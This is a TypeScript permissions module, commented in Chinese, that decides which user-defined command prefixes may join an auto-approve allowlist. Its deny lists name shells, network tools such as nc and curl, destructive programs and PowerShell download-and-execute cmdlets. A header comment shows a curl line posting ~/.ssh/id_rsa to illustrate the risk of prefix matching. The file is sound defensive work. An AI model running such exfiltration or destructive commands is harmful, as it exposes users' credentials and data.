/**
 * 自定义命令白名单条目的准入规则（docs/design/13-permissions.md「只读命令白名单」）。
 *
 * 白名单按**前缀**匹配：条目 `curl https://a.b` 也放行 `curl https://a.b -d @~/.ssh/id_rsa`，
 * 条目 `python` 放行任何 Python 代码。所以有些条目无论用户怎么写都等于「不再确认任意命令」，
 * 一律拒绝；有些程序只在裸写（或只带「执行一段代码」的参数）时如此。
 *
 * core（`AllowlistService.add`）与渲染端（审批卡「加入白名单」的建议与预检）共用这一份规则；
 * 内置条目不经这里（它们在 core 里逐条审过，另有形状测试）。
 */

/** 任何形式都不能进白名单：shell、包装器、按需下载执行、联网、破坏性 / 改权限的程序。 */
export const ALLOWLIST_NEVER_PROGRAMS: ReadonlySet<string> = new Set([
  // Shells（`bash x.sh` 也等于执行一段任意脚本）
  'bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'csh', 'tcsh', 'ash', 'busybox',
  'powershell', 'pwsh', 'cmd',
  // 包装器：后面接什么就执行什么
  'env', 'sudo', 'doas', 'su', 'xargs', 'nohup', 'timeout', 'nice', 'ionice', 'command',
  'exec', 'eval', 'builtin', 'time', 'watch', 'setsid', 'stdbuf', 'unbuffer', 'chroot',
  'nsenter', 'script', 'parallel',
  // 按需下载并执行
  'npx', 'pnpx', 'bunx', 'uvx', 'pipx',
  // 联网
  'curl', 'wget', 'ssh', 'scp', 'sftp', 'rsync', 'nc', 'ncat', 'netcat', 'socat', 'telnet',
  'ftp',
  // 破坏性 / 改权限
  'rm', 'rmdir', 'mv', 'cp', 'dd', 'chmod', 'chown', 'chgrp', 'ln', 'truncate', 'shred',
  'mkfs', 'install',
  // Windows（PowerShell 命令名不区分大小写，按小写比较）
  'invoke-expression', 'iex', 'start-process', 'invoke-webrequest', 'iwr',
  'invoke-restmethod', 'irm', 'remove-item', 'del', 'erase', 'rd', 'set-content',
  'out-file', 'copy-item', 'move-item', 'start-job', 'invoke-command', 'icm',
]);

/** 解释器：裸写或带「就地执行代码」的参数时拒绝（`python x.py` 这类固定脚本由用户自担风险）。 */
export const ALLOWLIST_INTERPRETERS: ReadonlySet<string> = new Set([
  'python', 'node', 'nodejs', 'deno', 'ruby', 'perl', 'php', 'lua', 'luajit',
  'tclsh', 'rscript', 'osascript', 'java', 'jshell',
]);

/** 解释器「就地执行代码 / 读 stdin」的参数：带上它们的条目等于放行任意代码。 */
const INLINE_CODE_FLAGS: ReadonlySet<string> = new Set([
  '-c', '-e', '-E', '-p', '-r', '-x', '-', '--eval', '--print', '--command', '--exec',
]);

/** 包管理器：裸写拒绝；`run` / `exec` / `dlx` 等动词见下。 */
export const ALLOWLIST_PACKAGE_MANAGERS: ReadonlySet<string> = new Set([
  'npm', 'pnpm', 'yarn', 'bun', 'pip', 'pip3', 'uv', 'poetry', 'cargo', 'go', 'gem',
  'bundle', 'composer', 'corepack',
]);

/** 包管理器「运行脚本」的动词：裸写（`npm run`）等于放行任意脚本，拒绝。 */
const RUN_VERBS: ReadonlySet<string> = new Set(['run', 'run-script', 'rum', 'urn']);

/** 包管理器「下载并执行任意包」的动词：任何形式都拒绝。 */
const DOWNLOAD_EXEC_VERBS: ReadonlySet<string> = new Set(['exec', 'x', 'dlx', 'create', 'init']);

/** 命令名的比较形式：去目录、去 Windows 可执行扩展名、小写；`python3.12` 归为 `python`。 */
export function allowlistProgramKey(word: string): string {
  const base = (word.split(/[\\/]/).pop() ?? word).toLowerCase();
  const stripped = base.replace(/\.(exe|cmd|bat|ps1|com)$/, '');
  if (/^python[0-9.]*$/.test(stripped)) return 'python';
  if (/^pip[0-9.]*$/.test(stripped)) return 'pip';
  return stripped;
}

/**
 * 自定义白名单条目为什么不能添加（可以添加 = null）。规则：
 * - 空条目、含 shell 结构字符（管道、重定向、替换、换行）的条目；
 * - 首个词是 {@link ALLOWLIST_NEVER_PROGRAMS} 中的程序（任何参数）；
 * - 裸写的解释器、包管理器、`git`；解释器带就地执行代码的参数（`python -c`、`node -e`）；
 * - 包管理器的「运行脚本」动词裸写（`npm run`、`pnpm run`）与「下载执行」动词（`npm exec`、
 *   `pnpm dlx`、`yarn dlx`……）任何形式；
 * - `git` 后紧跟全局选项（`git -c`、`git -C`、`git --exec-path` ……）。
 */
export function allowlistPatternRefusal(pattern: string): string | null {
  const trimmed = pattern.trim();
  if (trimmed.length === 0) return '条目不能为空';
  if (/[|&;<>()`$\n\r]/.test(trimmed)) {
    return '条目只能是命令前缀，不能含管道、重定向、替换或多条命令';
  }
  const words = trimmed.split(/\s+/);
  const first = words[0] ?? '';
  const program = allowlistProgramKey(first);
  if (ALLOWLIST_NEVER_PROGRAMS.has(program)) {
    return `「${first}」可以执行任意命令、联网或删改文件，不能加入白名单（需要时逐次确认）`;
  }
  const second = words[1];
  if (ALLOWLIST_INTERPRETERS.has(program)) {
    if (second === undefined) return `裸写的「${first}」等于放行任意代码，请写到具体脚本（如 ${first} scripts/check.py）`;
    if (words.slice(1).some((word) => INLINE_CODE_FLAGS.has(word)) || second === 'eval') {
      return `「${first} ${second}」会就地执行一段代码，不能加入白名单`;
    }
    if (RUN_VERBS.has(second) && words.length < 3) {
      return `「${first} ${second}」后面接什么都会执行，请写到具体脚本`;
    }
    return null;
  }
  if (ALLOWLIST_PACKAGE_MANAGERS.has(program)) {
    if (second === undefined) return `裸写的「${first}」等于放行它的所有子命令（含安装与运行脚本），请写到具体子命令（如 ${first} test）`;
    const verb = second.toLowerCase();
    if (INLINE_CODE_FLAGS.has(second) || verb === 'eval') {
      return `「${first} ${second}」会就地执行一段代码，不能加入白名单`;
    }
    if (DOWNLOAD_EXEC_VERBS.has(verb)) {
      return `「${first} ${second}」会下载并执行任意包，不能加入白名单`;
    }
    if (RUN_VERBS.has(verb) && words.length < 3) {
      return `「${first} ${second}」后面接什么脚本都会执行，请写到具体脚本（如 ${first} ${second} build）`;
    }
    return null;
  }
  if (program === 'git') {
    if (second === undefined) return '裸写的「git」等于放行所有 git 操作（含推送与改写历史），请写到具体子命令（如 git status）';
    if (second.startsWith('-')) return `「git ${second}」会改变 git 的配置或执行位置，不能加入白名单`;
  }
  return null;
}
